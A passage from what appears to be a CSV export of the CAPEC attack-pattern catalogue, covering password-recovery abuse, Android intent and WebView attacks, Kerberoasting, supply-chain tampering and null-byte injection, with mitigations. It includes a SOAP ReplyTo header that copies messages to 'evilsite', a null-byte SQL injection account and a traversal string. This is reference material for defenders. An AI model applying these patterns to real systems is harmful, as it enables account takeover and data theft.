available.::\",\"::285::\",\"\",\"\",\n50,\"Password Recovery Exploitation\",Standard,Draft,\"An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:212::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:Understand the password recovery mechanism and how it works.::STEP:2:PHASE:Exploit:DESCRIPTION:Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.::\",\"::The system allows users to recover their passwords and gain access back into the system.::Password recovery mechanism has been designed or implemented insecurely.::Password recovery mechanism relies only on something the user knows and not something the user has.::No third party intervention is required to use the password recovery mechanism.::\",\"::SKILL:Brute force attack:LEVEL:Low::SKILL:Social engineering and more sophisticated technical attacks.:LEVEL:Medium::\",\"::For a brute force attack one would need a machine with sufficient CPU, RAM and HD.::\",\"::Many incorrect attempts to answer the security question.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.::E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.::Ensure that your password recovery functionality is not vulnerable to an injection style attack.::\",\"::An attacker clicks on the forgot password and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.::phpBanner Exchange is a PHP script (using the mySQL database) that facilitates the running of a banner exchange without extensive knowledge of PHP or mySQL. A SQL injection was discovered in the password recovery module of the system that allows recovering an arbitrary user's password and taking over their account. The problem is due to faulty input sanitization in the phpBannerExchange, specifically the e-mail address of the user which is requested by the password recovery module. The e-mail address requested by the password recovery module on the resetpw.php page. That e-mail address is validated with the following regular expression: if(!eregi(^[_a-z0-9-]+(.[_a-z0-9-]+)*@[a-z0-9-]+(.[a-z0-9-]+)*(.[a-z]{2,3})$, $email)){ A bug in the implementation of eregi() allows to pass additional character using a null byte 0. Since eregi() is implemented in C, the variable $email is treated as a zero-terminated string. All characters following the Null Byte will not be recognized by the regular expression. So an e-mail address can be provided that includes the special character ' to break the SQL query below (and it will not be rejected by the regular expression because of the null byte trick). So a SQL injection becomes possible: $get_info=mysql_query(select * from banneruser whereemail='$email' ); This query will return a non-zero result set even though the email supplied (attacker's email) is not in the database. Then a new password for the user is generated and sent to the $email address, an e-mail address controlled by the attacker. An attacker can then log in into the system.See also: CVE-2006-3013::\",\"::522::640::\",\"\",\"\",\n500,\"WebView Injection\",Detailed,Draft,\"An adversary, through a previously installed malicious application, injects code into the context of a web page displayed by a WebView component. Through the injected code, an adversary is able to manipulate the DOM tree and cookies of the page, expose sensitive information, and can launch attacks against the web application from within the web page.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:253::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target web application] An adversary first needs to determine what web application they wish to target.:TECHNIQUE:Target web applications that require users to enter sensitive information.:TECHNIQUE:Target web applications that an adversary wishes to operate on behalf of a logged in user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create malicious application] An adversary creates an application, often mobile, that incorporates a WebView component to display the targeted web application. This malicious application needs to downloaded by a user, so adversaries will make this application useful in some way.:TECHNIQUE:Create a 3rd party application that adds useful functionality to the targeted web application. Victims will download the application as a means of using the targeted web application.:TECHNIQUE:Create a fun game that at some point directs a user to the targeted web application. For example, prompt the user to buy in game currency by directing them to PayPal.::STEP:3:PHASE:Experiment:DESCRIPTION:[Get the victim to download and run the application] An adversary needs to get the victim to willingly download and run the application.:TECHNIQUE:Pay for App Store advertisements:TECHNIQUE:Promote the application on social media, either through accounts made by the adversary or by paying for other accounts to advertise.::STEP:4:PHASE:Exploit:DESCRIPTION:[Inject malicious code] Once the victim runs the malicious application and views the targeted web page in the WebView component, the malicious application will inject malicious JavaScript code into the web application. This is done by using WebView's loadURL() API, which can inject arbitrary JavaScript code into pages loaded by the WebView component with the same privileges. This is often done by adding a script tag to the document body with a src destination to a remote location that serves malicious JavaScript code.:TECHNIQUE:Execute operations on the targeted web page on behalf of an authenticated user.:TECHNIQUE:Steal cookie information from the victim.:TECHNIQUE:Add in extra fields to the DOM in an attempt to get a user to divulge sensitive information.::\",\"::An adversary must be able install a purpose built malicious application onto the device and convince the user to execute it. The malicious application is designed to target a specific web application and is used to load the target web pages via the WebView component. For example, an adversary may develop an application that interacts with Facebook via WebView and adds a new feature that a user desires. The user would install this 3rd party app instead of the Facebook app.::\",\"\",\"\",\"\",\"\",\"::The only known mitigation to this type of attack is to keep the malicious application off the system. There is nothing that can be done to the target application to protect itself from a malicious application that has been installed and executed.::\",\"\",\"::749::940::\",\"\",\"\",\n501,\"Android Activity Hijack\",Detailed,Draft,\"An adversary intercepts an implicit intent sent to launch a Android-based trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:499::NATURE:ChildOf:CAPEC ID:173::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find an android application that uses implicit intents] Since this attack only works on android applications that use implicit intents, rather than explicit intents, an adversary must first identify an app that uses implicit intents to launch an Android-based trusted activity, and what that activity is.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create a malicious app] The adversary must create a malicious android app meant to intercept implicit intents to launch an Adroid-based trusted activity. This malicious app will mimic the trusted activiy's user interface to get the user to enter sensitive data.:TECHNIQUE:Specify the type of intent wished to be intercepted in the malicious app's manifest file using an intent filter::STEP:3:PHASE:Experiment:DESCRIPTION:[Get user to download malicious app] The adversary must get a user using the targeted app to download the malicious app by any means necessary::STEP:4:PHASE:Exploit:DESCRIPTION:[Gather sensitive data through malicious app] Once the target application sends an implicit intent to launch a trusted activity, the malicious app will be launched instead that looks identical to the interface of that activity. When the user enters sensitive information it will be captured by the malicious app.:TECHNIQUE:Gather login information from a user using a malicious app::\",\"::The adversary must have previously installed the malicious application onto the Android device that will run in place of the trusted activity.::\",\"::SKILL:The adversary must typically overcome network and host defenses in order to place malware on the system.:LEVEL:High::\",\"::Malware capable of acting on the adversary's objectives.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An 'explicit intent' is delivered to a specific application as declared within the intent, whereas an 'implicit intent' is directed to an application as defined by the Android operating system. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly (i.e., with appropriate security controls).::Never use implicit intents for inter-application communication.::\",\"\",\"::923::\",\"\",\"\",\n502,\"Intent Spoof\",Standard,Draft,\"An adversary, through a previously installed malicious application, issues an intent directed toward a specific trusted application's component in an attempt to achieve a variety of different objectives including modification of data, information disclosure, and data injection. Components that have been unintentionally exported and made public are subject to this type of an attack. If the component trusts the intent's action without verififcation, then the target application performs the functionality at the adversary's request, helping the adversary achieve the desired negative technical impact.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:148::\",\"\",\"::An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application will be used to issue spoofed intents.::\",\"\",\"\",\"\",\"\",\"::To limit one's exposure to this type of attack, developers should avoid exporting components unless the component is specifically designed to handle requests from untrusted applications. Developers should be aware that declaring an intent filter will automatically export the component, exposing it to public access. Critical, state-changing actions should not be placed in exported components. If a single component handles both inter- and intra-application requests, the developer should consider dividing that component into separate components. If a component must be exported (e.g., to receive system broadcasts), then the component should dynamically check the caller's identity prior to performing any operations. Requiring Signature or SignatureOrSystem permissions is an effective way of limiting a component's exposure to a set of trusted applications. Finally, the return values of exported components can also leak private data, so developers should check the caller's identity prior to returning sensitive values.::\",\"\",\"::284::\",\"\",\"\",\n503,\"WebView Exposure\",Standard,Draft,\"An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:122::\",\"\",\"::This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded, the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an application should limit permissions to only those required and should verify the origin of all web content it loads.::\",\"\",\"::284::\",\"\",\"\",\n504,\"Task Impersonation\",Standard,Stable,\"An adversary, through a previously installed malicious application, impersonates an expected or routine task in an attempt to steal sensitive information or leverage a user's privileges.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:173::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing sensitive information.:TECHNIQUE:Determine what tasks prompt a user for their credentials.:TECHNIQUE:Determine what tasks may prompt a user to authorize a process to execute with elevated privileges.::STEP:2:PHASE:Exploit:DESCRIPTION:[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials or to ride the user's privileges.:TECHNIQUE:Prompt a user for their credentials, while making the user believe the credential request is legitimate.:TECHNIQUE:Prompt a user to authorize a task to run with elevated privileges, while making the user believe the request is legitimate.::\",\"::The adversary must already have access to the target system via some means.::A legitimate task must exist that an adversary can impersonate to glean credentials.::The user's privileges allow them to execute certain tasks with elevated privileges.::\",\"::SKILL:Once an adversary has gained access to the target system, impersonating a task is trivial.:LEVEL:Low::\",\"::Malware or some other means to initially comprise the target system.::Additional malware to impersonate a legitimate task.::\",\"::Credential or permission elevation prompts that appear illegitimate or unexpected.::\",\"::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::\",\"::The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.::\",\"::An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.::An adversary prompts a user to authorize an elevation of privileges, implying that a background task needs additional permissions to execute. The user accepts the privilege elevation, allowing the adversary to execute additional malware or tasks with the user's privileges.::\",\"::1021::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.004:ENTRY NAME:Masquerading: Masquerade Task or Service::\",\"\",\n505,\"Scheme Squatting\",Detailed,Draft,\"An adversary, through a previously installed malicious application, registers for a URL scheme intended for a target application that has not been installed. Thereafter, messages intended for the target application are handled by the malicious application. Upon receiving a message, the malicious application displays a screen that mimics the target application, thereby convincing the user to enter sensitive information. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user as they think that they are interacting with the intended target application.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:616::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::The only known mitigation to this attack is to avoid installing the malicious application on the device. Applications usually have to declare the schemes they wish to register, so detecting this during a review is feasible.::\",\"\",\"\",\"\",\"\",\n506,\"Tapjacking\",Standard,Draft,\"An adversary, through a previously installed malicious application, displays an interface that misleads the user and convinces them to tap on an attacker desired location on the screen. This is often accomplished by overlaying one screen on top of another while giving the appearance of a single interface. There are two main techniques used to accomplish this. The first is to leverage transparent properties that allow taps on the screen to pass through the visible application to an application running in the background. The second is to strategically place a small object (e.g., a button or text field) on top of the visible screen and make it appear to be a part of the underlying application. In both cases, the user is convinced to tap on the screen but does not realize the application that they are interacting with.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:173::\",\"\",\"::This pattern of attack requires the ability to execute a malicious application on the user's device. This malicious application is used to present the interface to the user and make the attack possible.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::1021::\",\"\",\"\",\n507,\"Physical Theft\",Meta,Draft,\"An adversary gains physical access to a system or device through theft of the item. Possession of a system or device enables a number of unique attacks to be executed and often provides the adversary with an extended timeframe for which to perform an attack. Most protections put in place to secure sensitive information can be defeated when an adversary has physical access and enough time.\",\"\",,,\"\",\"\",\"::This type of attack requires the existence of a physical target that an adversary believes hosts something of value.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of attack, physical security techniques such as locks doors, alarms, and monitoring of targets should be implemented.::\",\"\",\"\",\"\",\"\",\n508,\"Shoulder Surfing\",Detailed,Draft,\"In a shoulder surfing attack, an adversary observes an unaware individual's keystrokes, screen content, or conversations with the goal of obtaining sensitive information. One motive for this attack is to obtain sensitive information about the target for financial, personal, political, or other gains. From an insider threat perspective, an additional motive could be to obtain system/application credentials or cryptographic keys. Shoulder surfing attacks are accomplished by observing the content over the victim's shoulder, as implied by the name of this attack.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:651::NATURE:CanPrecede:CAPEC ID:560::\",\"\",\"::The adversary typically requires physical proximity to the target's environment, in order to observe their screen or conversation. This may not be the case if the adversary is able to record the target and obtain sensitive information upon review of the recording.::\",\"::SKILL:In most cases, an adversary can simply observe and retain the desired information.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:LIKELIHOOD:High::\",\"::Be mindful of your surroundings when discussing or viewing sensitive information in public areas.::Pertaining to insider threats, ensure that sensitive information is not displayed to nor discussed around individuals without need-to-know access to said information.::\",\"::An adversary can capture a target's banking credentials and transfer money to adversary-controlled accounts.::An adversary observes the target's mobile device lock screen pattern/passcode and then steals the device, which can now be unlocked.::An insider could obtain database credentials for an application and sell the credentials on the black market.::An insider overhears a conversation pertaining to classified information, which could then be posted on an anonymous online forum.::\",\"::200::359::\",\"\",\"\",\n509,\"Kerberoasting\",Detailed,Stable,\"Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:652::NATURE:CanPrecede:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:Scan for user accounts with set SPN values:TECHNIQUE:These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means.::STEP:2:PHASE:Explore:DESCRIPTION:Request service tickets:TECHNIQUE:Using user account's SPN value, request other service tickets from Active Directory::STEP:3:PHASE:Experiment:DESCRIPTION:Extract ticket and save to disk:TECHNIQUE:Certain tools like Mimikatz can extract local tickets and save them to memory/disk.::STEP:4:PHASE:Exploit:DESCRIPTION:Crack the encrypted ticket to harvest plain text credentials:TECHNIQUE:Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack.::\",\"::The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.::The adversary requires use of a third-party credential harvesting tool (e.g., Mimikatz).::The adversary requires a brute force tool.::\",\"::SKILL::LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Gain Privileges::\",\"::Monitor system and domain logs for abnormal access.::Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity, and they should expire after a period of time.::Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.::Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.::\",\"::PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]::\",\"::522::308::309::294::263::262::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1558.003:ENTRY NAME:Steal or Forge Kerberos Tickets:Kerberoasting::\",\"\",\n51,\"Poison Web Service Registry\",Detailed,Draft,\"SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:203::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice.:TECHNIQUE:An adversary can perform a denial of service attack on a web service.:TECHNIQUE:An adversary can redirect requests or responses to a malicious service.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to.:TECHNIQUE:Create a service to that requests are sent to in addition to the legitimate service and simply record the requests.:TECHNIQUE:Create a service that will give malicious responses to a service provider.:TECHNIQUE:Act as a malicious service provider and respond to requests in an arbitrary way.::STEP:4:PHASE:Exploit:DESCRIPTION:[Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider.:TECHNIQUE:Intercept and change WS-Adressing headers to route to a malicious service or service provider.:TECHNIQUE:Provide incorrect information in schema or metadata to cause a denial of service.:TECHNIQUE:Delete information about service procider interfaces to cause a denial of service.::\",\"::The attacker must be able to write to resources or redirect access to the service registry.::\",\"::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::\",\"::Capability to directly or indirectly modify registry resources::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: Enforce principle of least privilege::Design: Harden registry server and file access permissions::Implementation: Implement communications to and from the registry using secure protocols::\",\"::WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime. <S:Header><wsa:MessageID>http://example.com/Message </wsa:MessageID><wsa:ReplyTo><wsa:Address>http://valid.example/validClient</wsa:Address> </wsa:ReplyTo><wsa:ReplyTo><wsa:Address>http://evilsite/evilClient</wsa:Address> </wsa:ReplyTo><wsa:FaultTo><wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address> </wsa:FaultTo> </S:Header> In this example evilsite is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault.::\",\"::285::74::693::\",\"\",\"\",\n510,\"SaaS User Request Forgery\",Standard,Draft,\"An adversary, through a previously installed malicious application, performs malicious actions against a third-party Software as a Service (SaaS) application (also known as a cloud based application) by leveraging the persistent and implicit trust placed on a trusted user's session. This attack is executed after a trusted user is authenticated into a cloud service, piggy-backing on the authenticated session, and exploiting the fact that the cloud service believes it is only interacting with the trusted user. If successful, the actions embedded in the malicious application will be processed and accepted by the targeted SaaS application and executed at the trusted user's privilege level.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:21::\",\"\",\"::An adversary must be able install a purpose built malicious application onto the trusted user's system and convince the user to execute it while authenticated to the SaaS application.::\",\"::SKILL:This attack pattern often requires the technical ability to modify a malicious software package (e.g. Zeus) to spider a targeted site and a way to trick a user into a malicious software download.:LEVEL:Medium::\",\"\",\"\",\"\",\"::To limit one's exposure to this type of attack, tunnel communications through a secure proxy service.::Detection of this type of attack can be done through heuristic analysis of behavioral anomalies (a la credit card fraud detection) which can be used to identify inhuman behavioral patterns. (e.g., spidering)::\",\"\",\"::346::\",\"\",\"TYPE:Other:NOTE:SaaS/Cloud applications are often accessed from unmanaged systems and devices, over untrusted networks that are outside corporate IT control. The likelihood of a cloud service being accessed by a trusted user though an untrusted device is high. Several instances of this style of attack have been found.::\",\n511,\"Infiltration of Software Development Environment\",Detailed,Draft,\"An attacker uses common delivery mechanisms such as email attachments or removable media to infiltrate the IDE (Integrated Development Environment) of a victim manufacturer with the intent of implanting malware allowing for attack control of the victim IDE environment. The attack then uses this access to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions. This will allow and aid the attack to meet the goal of future compromise of a recipient of the victim's manufactured product further down in the supply chain.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).::The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.::The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.::\",\"::SKILL:Intelligence about the manufacturer's operating environment and infrastructure.:LEVEL:Medium::SKILL:Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.:LEVEL:High::SKILL:Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc):LEVEL:High::\",\"\",\"\",\"\",\"::Avoid the common delivery mechanisms of adversaries, such as email attachments, which could introduce the malware.::\",\"::The attacker, knowing the victim runs email on a system adjacent to the IDE system, sends a phishing email with a malicious attachment to the victim. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent IDE system from the victim's workstation. The attacker is then able to exfiltrate sensitive data about the software being developed on the IDE system.::Using rogue versions of Xcode (Apple's app development tool) downloaded from third-party websites, it was possible for the adversary to insert malicious code into legitimate apps during the development process.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\",\n516,\"Hardware Component Substitution During Baselining\",Detailed,Draft,\"An adversary with access to system components during allocated baseline development can substitute a maliciously altered hardware component for a baseline component during the product development and research phases. This can lead to adjustments and calibrations being made in the product so that when the final product, now containing the modified component, is deployed it will not perform as designed and be advantageous to the adversary.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The adversary will need either physical access or be able to supply malicious hardware components to the product development facility.::\",\"::SKILL:Intelligence data on victim's purchasing habits.:LEVEL:Medium::SKILL:Resources to maliciously construct/alter hardware components used for testing by the supplier.:LEVEL:High::SKILL:Resources to physically infiltrate supplier.:LEVEL:High::\",\"\",\"\",\"\",\"::Hardware attacks are often difficult to detect, as inserted components can be difficult to identify or remain dormant for an extended period of time.::Acquire hardware and hardware components from trusted vendors. Additionally, determine where vendors purchase components or if any components are created/acquired via subcontractors to determine where supply chain risks may exist.::\",\"::An adversary supplies the product development facility of a network security device with a hardware component that is used to simulate large volumes of network traffic. The device claims in logs, stats, and via the display panel to be pumping out very large quantities of network traffic, when it is in fact putting out very low volumes. The developed product is adjusted and configured to handle what it believes to be a heavy network load, but when deployed at the victim site the large volumes of network traffic are dropped instead of being processed by the network security device. This allows the adversary an advantage when attacking the victim in that the adversary's presence may not be detected by the device.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n517,\"Documentation Alteration to Circumvent Dial-down\",Detailed,Draft,\"An attacker with access to a manufacturer's documentation, which include descriptions of advanced technology and/or specific components' criticality, alters the documents to circumvent dial-down functionality requirements. This alteration would change the interpretation of implementation and manufacturing techniques, allowing for advanced technologies to remain in place even though these technologies might be restricted to certain customers, such as nations on the terrorist watch list, giving the attacker on the receiving end of a shipped product access to an advanced technology that might otherwise be restricted.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::Advanced knowledge of internal software and hardware components within manufacturer's development environment.::Access to the manufacturer's documentation.::\",\"::SKILL:Ability to read, interpret, and subsequently alter manufacturer's documentation to prevent dial-down capabilities.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.:LEVEL:High::\",\"\",\"\",\"\",\"::Digitize documents and cryptographically sign them to verify authenticity.::Password protect documents and make them read-only for unauthorized users.::Avoid emailing important documents and configurations.::Ensure deleted files are actually deleted.::Maintain backups of the document for recovery and verification.::\",\"::A product for manufacture exists that contains advanced cryptographic capabilities, including algorithms that are restricted from being shipped to some nations. An attacker from one of the restricted nations alters the documentation to ensure that when the product is manufactured for shipment to a restricted nation, the software compilation steps that normally would prevent the advanced cryptographic capabilities from being included are actually included. When the product is shipped to the attacker's home country, the attacker is able to retrieve and/or use the advanced cryptographic capabilities.::\",\"\",\"\",\"\",\n518,\"Documentation Alteration to Produce Under-performing Systems\",Detailed,Draft,\"An attacker with access to a manufacturer's documentation alters the descriptions of system capabilities with the intent of causing errors in derived system requirements, impacting the overall effectiveness and capability of the system, allowing an attacker to take advantage of the introduced system capability flaw once the system is deployed.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::Advanced knowledge of software and hardware capabilities of a manufacturer's product.::Access to the manufacturer's documentation.::\",\"::SKILL:Ability to read, interpret, and subsequently alter manufacturer's documentation to misrepresent system capabilities.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.:LEVEL:High::\",\"\",\"\",\"\",\"::Digitize documents and cryptographically sign them to verify authenticity.::Password protect documents and make them read-only for unauthorized users.::Avoid emailing important documents and configurations.::Ensure deleted files are actually deleted.::Maintain backups of the document for recovery and verification.::Separate need-to-know information from system configuration information depending on the user.::\",\"::A security subsystem involving encryption is a part of a product, but due to the demands of this subsystem during operation, the subsystem only runs when a specific amount of memory and processing is available. An attacker alters the descriptions of the system capabilities so that when deployed with the minimal requirements at the victim location, the encryption subsystem is never operational, leaving the system in a weakened security state.::\",\"\",\"\",\"\",\n519,\"Documentation Alteration to Cause Errors in System Design\",Detailed,Draft,\"An attacker with access to a manufacturer's documentation containing requirements allocation and software design processes maliciously alters the documentation in order to cause errors in system design. This allows the attacker to take advantage of a weakness in a deployed system of the manufacturer for malicious purposes.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::Advanced knowledge of software capabilities of a manufacturer's product.::Access to the manufacturer's documentation.::\",\"::SKILL:Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in system design.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.:LEVEL:High::\",\"\",\"\",\"\",\"::Digitize documents and cryptographically sign them to verify authenticity.::Password protect documents and make them read-only for unauthorized users.::Avoid emailing important documents and configurations.::Ensure deleted files are actually deleted.::Maintain multiple instances of the document across different privileged users for recovery and verification.::\",\"::During operation, a firewall will restart various subsystems to reload and implement new rules as added by the user. An attacker alters the software design dependencies in the manufacturer's documentation so that under certain predictable conditions the reload will fail to load in rules resulting in a fail open state. Once deployed at a victim site, this will allow the attacker to bypass the victim's firewall.::\",\"\",\"\",\"\",\n52,\"Embedding NULL Bytes\",Detailed,Draft,\"An adversary embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects postfix null byte(s) to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.:TECHNIQUE:Try different encodings for null such as 0 or %00::STEP:3:PHASE:Exploit:DESCRIPTION:[Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) such that they remove data after the null byte(s) in a way that is beneficial to them.:TECHNIQUE:If the input is a directory as part of a longer file path, add a null byte(s) at the end of the input to try to traverse to the given directory.::\",\"::The program does not properly handle postfix NULL terminators::\",\"::SKILL:Directory traversal:LEVEL:Medium::SKILL:Execution of arbitrary code:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Properly handle the NULL characters supplied as part of user input prior to doing anything with the data.::\",\"::Directory Browsing Assume a Web application allows a user to access a set of reports. The path to the reports directory may be something like web/username/reports. If the username is supplied via a hidden field, an adversary could insert a bogus username such as ../../../../../WINDOWS. If the adversary needs to remove the trailing string /reports, then they can simply insert enough characters so the string is truncated. Alternatively the adversary might apply the postfix NULL character (%00) to determine whether this terminates the string. Different forms of NULL to think about include PATH%00PATH[0x00]PATH[alternate representation of NULL 